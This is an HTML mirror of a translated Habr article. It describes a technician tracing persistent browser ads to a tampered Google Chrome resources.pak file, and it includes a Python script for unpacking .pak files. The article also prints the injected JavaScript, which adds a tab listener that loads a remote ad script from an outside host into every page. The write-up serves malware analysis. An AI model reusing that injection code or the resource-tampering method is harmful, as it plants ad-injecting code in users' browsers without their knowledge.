<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>New adware is embedded directly in the browser.</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="There is a new type of adware, which is embedded in the browser itself. 
 Another computer with a complaint about advertising in the browser - as usua...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>New adware is embedded directly in the browser.</h1><div class="post__text post__text-html js-mediator-article"><h1>  There is a new type of adware, which is embedded in the browser itself. </h1><br><img src="https://habrastorage.org/files/0b4/e1f/b79/0b4e1fb7970a425ba143afeddcb828bd.png" align="left">  Another computer with a complaint about advertising in the browser - as usual, according to the user, nothing started, but the fact is - advertising climbs almost every site from all slots and search queries are replaced.  Usually, most of these problems are solved immediately in five minutes using <a href="https://antisms.com/">AntiSMS</a> , then the program operation log is checked and, if necessary, tails such as third-party extensions in browsers are cleared, but not in this case.  None of the usual means helped immediately, even antiviruses did not see any problems in the system, and therefore it became interesting - where did the advertising come from? <br><a name="habracut"></a><br>  To save time before manual work, the system was quickly checked through AVZ, Dr.Web CureIt!  and Kaspersky Virus Removal Tool - all reported on the cleanliness of the system, while the advertisement was shown against the background of their work.  Which is typical, all other browsers were removed in the system, only Google Chrome remained, and new methods of infection are not common, so suspicion fell on it last. <br><br>  First of all, an advertising module from the company Express Find was found with the same legal digital signature of April 8, quite fresh.  He used three autorun sites at the same time, but after it was removed, ads miraculously continued to appear.  Further investigation revealed that it remains even when creating a new profile.  It used to be that adware settled there, but here the developers decided to show creativity so that the advertisement would accompany the user with any profile and under any account. <br><br>  Further the folder in which Google Chrome was installed was investigated.  Everything looks good - all files are digitally signed, nothing unusual.  However, to check the folder was renamed and immediately installed a new chrome of the same version.  Then it turned out that the resources.pak file is different from the original one and the problem is here.  Resources were immediately replaced for verification and everything was confirmed - the culprit was found.  A quick search for unpacking resources showed the following python script: 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> collections <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> struct <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys def ReadFile(filename, <span class="hljs-keyword"><span class="hljs-keyword">encoding</span></span>): mode = <span class="hljs-string"><span class="hljs-string">'rb'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> encoding == <span class="hljs-number"><span class="hljs-number">0</span></span> <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-string"><span class="hljs-string">'rU'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">with</span></span> <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(filename, mode) <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> f: data = f.<span class="hljs-keyword"><span class="hljs-keyword">read</span></span>() <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">encoding</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> (<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>): data = data.decode(<span class="hljs-keyword"><span class="hljs-keyword">encoding</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> data PACK_FILE_VERSION = <span class="hljs-number"><span class="hljs-number">4</span></span> HEADER_LENGTH = <span class="hljs-number"><span class="hljs-number">2</span></span> * <span class="hljs-number"><span class="hljs-number">4</span></span> + <span class="hljs-number"><span class="hljs-number">1</span></span> # Two uint32s. (file <span class="hljs-keyword"><span class="hljs-keyword">version</span></span>, number <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> entries) <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> # one uint8 (<span class="hljs-keyword"><span class="hljs-keyword">encoding</span></span> <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> <span class="hljs-type"><span class="hljs-type">text</span></span> resources) def UnpackDataPack(input_file): """Reads a data pack file and returns a dictionary.""" data = ReadFile(input_file, <span class="hljs-number"><span class="hljs-number">0</span></span>) original_data = data # <span class="hljs-keyword"><span class="hljs-keyword">Read</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">header</span></span>. <span class="hljs-keyword"><span class="hljs-keyword">version</span></span>, num_entries, encoding = struct.unpack("&lt;IIB", data[:HEADER_LENGTH]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> != PACK_FILE_VERSION: print "Wrong file version in ", input_file <span class="hljs-keyword"><span class="hljs-keyword">raise</span></span> WrongFileVersion resources = {} <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> num_entries == <span class="hljs-number"><span class="hljs-number">0</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> DataPackContents(resources, <span class="hljs-keyword"><span class="hljs-keyword">encoding</span></span>) # <span class="hljs-keyword"><span class="hljs-keyword">Read</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">index</span></span> <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> data. data = data[HEADER_LENGTH:] kIndexEntrySize = <span class="hljs-number"><span class="hljs-number">2</span></span> + <span class="hljs-number"><span class="hljs-number">4</span></span> # <span class="hljs-keyword"><span class="hljs-keyword">Each</span></span> entry <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> a uint16 <span class="hljs-keyword"><span class="hljs-keyword">and</span></span> a uint32. <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> _ <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(num_entries): id, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> = struct.unpack("&lt;HI", data[:kIndexEntrySize]) data = data[kIndexEntrySize:] next_id, next_offset = struct.unpack("&lt;HI", data[:kIndexEntrySize]) resources[id] = original_data[<span class="hljs-keyword"><span class="hljs-keyword">offset</span></span>:next_offset] filetype = <span class="hljs-string"><span class="hljs-string">'bin'</span></span> fileheader = <span class="hljs-string"><span class="hljs-string">''</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">join</span></span>(original_data[<span class="hljs-keyword"><span class="hljs-keyword">offset</span></span>:<span class="hljs-keyword"><span class="hljs-keyword">offset</span></span>+<span class="hljs-number"><span class="hljs-number">1</span></span>]) print ord(fileheader[<span class="hljs-number"><span class="hljs-number">0</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> fileheader == <span class="hljs-string"><span class="hljs-string">'&lt;'</span></span>: filetype = <span class="hljs-string"><span class="hljs-string">'html'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> fileheader == <span class="hljs-string"><span class="hljs-string">'\x89'</span></span>: filetype = <span class="hljs-string"><span class="hljs-string">'png'</span></span> elif fileheader == <span class="hljs-string"><span class="hljs-string">'/'</span></span>: filetype = <span class="hljs-string"><span class="hljs-string">'js'</span></span> <span class="hljs-keyword"><span class="hljs-keyword">of</span></span> = <span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-string"><span class="hljs-string">'{0}.{1}'</span></span>.format(id,filetype),<span class="hljs-string"><span class="hljs-string">'wb'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">of</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(original_data[<span class="hljs-keyword"><span class="hljs-keyword">offset</span></span>:next_offset]) <span class="hljs-keyword"><span class="hljs-keyword">of</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>() def main(): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(sys.argv) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>: UnpackDataPack(sys.argv[<span class="hljs-number"><span class="hljs-number">1</span></span>]) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> __name__ == <span class="hljs-string"><span class="hljs-string">'__main__'</span></span>: main()</code> </pre> <br><br>  He successfully unpacked two versions of resources, and after comparing, it turned out that the following block was added to the beginning of one of the adware scripts: <br><br><pre> <code class="javascript hljs">chrome.tabs.onUpdated.addListener( <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">tabId,changeInfo,tab</span></span></span><span class="hljs-function">)</span></span>{ chrome.tabs.executeScript(tabId,{<span class="hljs-attr"><span class="hljs-attr">code</span></span>:<span class="hljs-string"><span class="hljs-string">" if(!window.blgcran){ window.blgcran = true; var scr=document.createElement('script'); scr.src='https://expressfind-a.akamaihd.net/ExpressFind/cr?t=BLGC&amp;g=ca4874d9-0a3e-4215-9772-67fb5ba1c08a'; document.head.appendChild(scr);} "</span></span>})});</code> </pre> <br><br>  Thus, the current site via https with a legal digital signature loads ads and successfully bypasses antiviruses.  A new method of implementation allows the method to work even after the complete removal of adware from the system. </div><p>Source: <a href="https://habr.com/ru/post/255333/">https://habr.com/ru/post/255333/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../255323/index.html">We are switching from STM32 to the Russian K1986BE92QI microcontroller. Setting up the project in keil and flashing LED</a></li>
<li><a href="../255325/index.html">Malefactors use complex malware to attack Russian business</a></li>
<li><a href="../255327/index.html">Why one AJAX is not enough: WAMP protocol</a></li>
<li><a href="../255329/index.html">Simulate sensor readings using an array of waypoints</a></li>
<li><a href="../255331/index.html">Vulnerability in Xamarin for Android: we replace dll and we eat for free</a></li>
<li><a href="../255337/index.html">How does a boiler house in Middle Akhtuba differ from a power center of a data center?</a></li>
<li><a href="../255339/index.html">Hardware room (about satellite network infrastructure and oscilloscope)</a></li>
<li><a href="../255343/index.html">How we fought xss / sql attack with Nginx and Naxsi</a></li>
<li><a href="../255345/index.html">About: about page in Firefox</a></li>
<li><a href="../255349/index.html">Chronicles of the laboratory: a rat in a polymer helmet, spectral analysis of a can of chips and blue electrical tape</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>